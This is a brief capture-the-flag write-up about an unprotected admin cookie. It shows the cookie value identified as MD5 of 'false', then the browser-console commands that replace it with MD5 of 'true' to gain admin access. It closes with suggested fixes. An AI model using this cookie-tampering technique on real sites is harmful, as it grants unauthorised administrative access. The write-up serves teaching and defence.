# Unprotected Admin Cookie

## Vulnerability

Looking at the page's cookies, we can see:
```
> document.cookie
< 'I_am_admin=68934a3e9455fa72420237eb05902327'
```

Using a universal hash decryptor likes [hashes.com](https://hashes.com/en/decrypt/hash), the MD5 match has been found:
```
68934a3e9455fa72420237eb05902327:false:MD5
```

So by settings the `I_am_admin` cookie value as `md5('true')` a.k.a `b326b5062b2f0e69046810717534cb09`, we get the flag after a page reload.
```
> document.cookie = 'I_am_admin=b326b5062b2f0e69046810717534cb09'
> window.location.reload();
< Good job! Flag : ...
```

## Possible Fix

- Use an opaque PHP session to store this information.
- Use a structured token (e.g. a JWT) for authentication and authorization.
